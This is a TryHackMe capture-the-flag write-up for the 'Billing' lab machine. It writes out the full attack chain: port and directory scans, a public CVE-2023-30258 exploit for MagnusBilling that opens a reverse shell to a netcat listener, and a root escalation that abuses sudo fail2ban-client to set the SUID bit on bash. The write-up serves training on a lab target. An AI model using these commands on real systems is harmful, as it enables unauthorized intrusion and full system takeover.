# Billing - Writeup

## 📋 General Information

- **Platform**: TryHackMe
- **Difficulty**: Easy
- **Category**: CVE Exploitation | Research | Privilege Escalation
- **Date**: 24/02/2026
- **Time spent**: ~50 minutes
- **Author**: Samuel Rodríguez aka Testarious

## 📝 Summary

In this CTF we will focus on CVE research and the importance of doing good Google searches to find relevant information.

## 🔍 Reconnaissance and Enumeration

### Port Scanning

We start by scanning the target machine's ports with Nmap.

```bash
# Commands used
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.112.173.45
nmap -sCV -p22,80,3306,5038 10.112.173.45
```
**Results:**

![Nmap](./content/screenshots/billing/nmap.png)


As we can see in the image, the open ports are 22 (SSH), 80 (HTTP), 3306 (MySQL), and 5038 (Asterisk Call Manager). We scan them more thoroughly to see the service versions.

First, we visit the website available on port 80 and find a login panel.

![Web](./content/screenshots/billing/login.png)

We try to log in with default credentials like "admin:admin" or "root:root" but it doesn't work. Additionally, we see there's a "Forgot Password" link that takes us to a password recovery page, but when we enter any email, no email is received. We also try the typical "SQL Injection" in the email field but it doesn't work.

We perform a directory scan with Ffuf to see if there are any hidden directories.

```bash
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.112.173.45/mbilling/FUZZ 
```

**Results:**

![Ffuf](./content/screenshots/billing/ffuf.png)

We see there are some interesting directories like "/tmp", "/resources" and "/archive". But after accessing them and reviewing their content, we don't see anything relevant.

## 💻 Exploitation

During the web reconnaissance, looking at the technologies used to create it, we see that it's made with the "Magnus Billing" tool.

``MagnusBilling is an open source and free VoIP (Voice over IP) billing system, designed for telephone service providers based on Asterisk. It allows managing customers, rates, trunks, and performing monitoring of mass calls and SMS. It is a complete tool that facilitates the administration and billing of telephone services.``

### Attack Vector 1:

So we decide to search for known vulnerabilities for this tool and after a bit of research and Google searches, we find that there is an associated CVE (CVE-2023-30258) and a Python script that exploits it for this tool.

```bash
https://github.com/hadrian3689/magnus_billing_rce
```

![GitHub](./content/screenshots/billing/github.png)

We proceed to download the exploit and check the help menu to understand how to use it.

```bash
python3 exploit.py -h
```

After seeing how the exploit is used, we proceed to set up a listener with Netcat to receive the reverse shell.

```bash
nc -nlvp 4444
```

And then we execute the exploit.

```bash
python3 exploit.py -t 'http://10.112.173.45/mbilling/' -lh 10.11.16.151 -lp 4444
```

![Exploit](./content/screenshots/billing/exploit.png)

And after successful execution, we obtain a reverse shell as user "asterisk".

![Listen](./content/screenshots/billing/listen.png)

After checking the system users by looking at the `/etc/passwd` file, we see there is a user called "magnus". Which in its directory `/home/magnus` has the user flag.

![Flag](./content/screenshots/billing/user_flag.png)

## 🔐 Privilege Escalation

### Local Enumeration

We use the command `sudo -l` to see if the user `asterisk` can execute commands as root.

```bash
sudo -l
```

![Sudo -l](./content/screenshots/billing/sudo.png)

### Escalation Method

As we can see in the image, the user `asterisk` can execute the command `sudo /usr/bin/fail2ban-client` as root.

``Fail2ban is a tool that protects services (SSH, Apache, etc.) by blocking IP addresses after several failed authentication attempts.``


In this part, we also do a bit of research with Google to find the way to escalate privileges with this binary. And we find a series of instructions that allow us to execute commands as root.

```bash
# set asterisk-iptables → Modifies the jail called asterisk-iptables.
# action iptables-allports-ASTERISK → Specifies the action we want to modify.
# actionban 'chmod +s /bin/bash' → Changes the command that will be executed when an IP is banned.

sudo /usr/bin/fail2ban-client set asterisk-iptables action iptables-allports-ASTERISK actionban 'chmod +s /bin/bash'

# Ban any IP to force the execution of the command
sudo /usr/bin/fail2ban-client set asterisk-iptables banip 10.10.1.120

# Move to the action.d directory
cd /etc/fail2ban/action.d

# Execute bash with root privileges
bash -p
```

![Root Flag](./content/screenshots/billing/root_flag.png)

And finally, we obtain the root flag!

## 🛠️ Tools Used

| Tool | Version | Specific use |
|-------------|---------|----------------|
| nmap | 7.80 | Port and service scanning |
| ffuf | 1.3.1 | Directory fuzzing |
| python3 | 3.8 | Command execution |


## 🏆 Conclusion

This CTF teaches us the importance of conducting good research to identify vulnerable services and find associated CVEs, as well as exploits or scripts that exploit them to gain initial access. Then, through sudo permission enumeration, we manage to escalate privileges and gain full system access. Keep going! 🚀